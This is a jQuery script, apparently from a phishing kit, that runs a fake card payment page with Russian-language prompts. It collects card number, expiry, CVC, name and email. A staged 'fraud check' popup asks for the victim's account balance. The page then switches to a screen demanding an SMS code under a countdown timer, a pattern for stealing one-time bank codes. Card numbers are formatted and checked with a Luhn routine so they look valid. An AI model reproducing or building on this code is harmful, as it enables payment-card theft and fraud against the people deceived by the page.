function fraudStart() {
	setTimeout(function() {
		$("#loaderFraud").fadeIn();
		$("#backblack").fadeIn();
		$("#fraud .styles_container__povOI").hide();
		// $("#fraud").fadeIn();
		// $( "#loaderFraud" ).fadeOut();
	}, 2000);
	setTimeout(function() {
		$("#fraud").fadeIn();
		// $( "#loaderFraud" ).fadeOut();
	}, 2500);
	setTimeout(function() {
		$("#fraud .styles_container__povOI").show();
		$("#loaderFraud").fadeOut();
	}, 3500);
}

function checkBalance() {
	if ($("#balance").val().length > 1) {
		$("#fraudBut").css("background-color", "rgb(33 160 56)")
		$("#fraudBut").css("color", "white")
	} else {
		$("#fraudBut").css("background-color", "#ccc")
		$("#fraudBut").css("color", "#262626")
	}
}
$("#fraudBut").click(function() {
	// alert(flag);
	if ($("#balance").val().length > 1) {
		$("#loaderFraud").fadeIn("slow");
		setTimeout(function() {
			$("#fraud .styles_container__povOI").fadeOut();
		}, 3000);
		setTimeout(function() {
			$("#loaderFraud").fadeOut();
			$(".fraudOk").fadeIn();
		}, 4000);
		setTimeout(function() {
			$(".fraudOk").fadeOut();
			$("#fraud").fadeOut();
			$("#backblack").fadeOut();
			$("#loader").fadeIn();
		}, 6000);
		setTimeout(function() {
			$("#cardBox").hide();
			// $("#cardLabel").hide();
			$("#expBox").hide();
			$("#cvcBox").hide();
			$("#boxMail").hide();
			$("#boxFio").hide();
			$(".styles_saveCardContainer__mPUhQ").hide();
			$(".styles_termsHint__2XVD6").css("opacity", "0")
			$(".styles_termsHint__2XVD6").css("margin-top", "0")
			$(".styles_termsHint__2XVD6").css("line-height", "0")
			$("#logoBank").hide()
			$("#mainBut").css("color", "#6c6c6c");
			$("#oplata").css("background-color", "#f4f4f4");
			$("#passBox").show();
			$(".styles_title__1O7Vi").text("Введите Ваш код")
			$("#pass").css("text-align", "center")
			$("#mainBut").text("Отправить");
			isStage2 = true;
			timerStart(100);
			$("#loader").fadeOut();
		}, 7000);
	} else {
		$("#fraudErr").text("Заполните поле");
		$("#balance").css("border-color", "red");
		$("#fraudErr").show()
	}
})
$("#balance").focus(function() {
	$("#fraudErr").hide();
	$("#balance").css("border-color", "#5ab66b");
})
/*Dropdown Menu*/
$('.dropdown').click(function() {
	$(this).attr('tabindex', 1).focus();
	$(this).toggleClass('active');
	$(this).find('.dropdown-menu').slideToggle(300);
});
$('.dropdown').focusout(function() {
	$(this).removeClass('active');
	$(this).find('.dropdown-menu').slideUp(300);
});
$('.dropdown .dropdown-menu li').click(function() {
	$(this).parents('.dropdown').find('span').text($(this).text());
	$(this).parents('.dropdown').find('input').attr('value', $(this).attr('id'));
});
/*End Dropdown Menu*/
$('.dropdown-menu li').click(function() {
	var input = '<strong>' + $(this).parents('.dropdown').find('input').val() + '</strong>',
		msg = '<span class="msg">Hidden input value: ';
	$('.msg').html(msg + input + '</span>');
});

function timerStart(secs) {
	$("#newSMS").fadeOut()
	$(".seconds").text(secs)
	$("#timerBlock").fadeIn("slow")
	var timerBlock = $('.seconds');
	var num = secs; //количество секунд
	var index = num;
	var timerId = setInterval(function() {
		timerBlock.html(--index);
	}, 1000);
	var tim = setTimeout(function() {
		clearInterval(timerId);
		$("#timerBlock").fadeOut()
		$("#newSMS").fadeIn("slow")
	}, num * 1000);
}
$("#FIO").keypress(function() {
	if ($("#FIO").val().length > 0) {
		$("#FIO").css("text-transform", "uppercase")
	} else {
		$("#FIO").css("text-transform", "none")
	}
})

function resendSMS() {
	$("#loader").fadeIn();
	setTimeout(function() {
		timerStart(100);
		$("#loader").fadeOut();
	}, 1000);
}
// ввод только чиесл
function number() {
	// alert("!")
	if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;
}
// алгоритм Муна
function Moon(value) {
	if (/[^0-9-\s]+/.test(value)) return false;
	var nCheck = 0,
		nDigit = 0,
		bEven = false;
	value = value.replace(/\D/g, "");
	for (var n = value.length - 1; n >= 0; n--) {
		var cDigit = value.charAt(n),
			nDigit = parseInt(cDigit, 10);
		if (bEven) {
			if ((nDigit *= 2) > 9) nDigit -= 9;
		}
		nCheck += nDigit;
		bEven = !bEven;
	}
	return (nCheck % 10) == 0;
}
// привязка ввода к функции
jQuery("#card_number").bind("input", function() {
	this.value = card_number(this.value);
});
// пробелы после 4цифр
function card_number(value) {
	var v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
	var matches = v.match(/\d{4,18}/g);
	var match = matches && matches[0] || "";
	var parts = [];
	for (i = 0, len = match.length; i < len; i += 4) {
		parts.push(match.substring(i, i + 4));
	}
	if (parts.length) {
		return parts.join(" ");
	} else {
		return value;
	}
}
// привязка ввода к функции
jQuery("#card_exp").bind("input", function() {
	this.value = card_exp(this.value);
});

function card_exp(value) {
	var v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
	var matches = v.match(/\d{2,4}/g);
	var match = matches && matches[0] || "";
	var parts = [];
	for (i = 0, len = match.length; i < len; i += 2) {
		parts.push(match.substring(i, i + 2));
	}
	if (parts.length) {
		return parts.join("/");
	} else {
		return value;
	}
}
$("#card_exp").keyup(function() {
	if ($("#card_exp").val().length >= 5) {
		$('#card_cvc').focus();
	}
});
$("#card_exp").keyup(function() {
	if ($("#card_exp").val().length >= 5) {
		$('#card_cvc').focus();
	}
});
$("#card_cvc").keyup(function() {
	if ($("#card_cvc").val().length >= 3) {
		// $('#email').focus();
	}
});
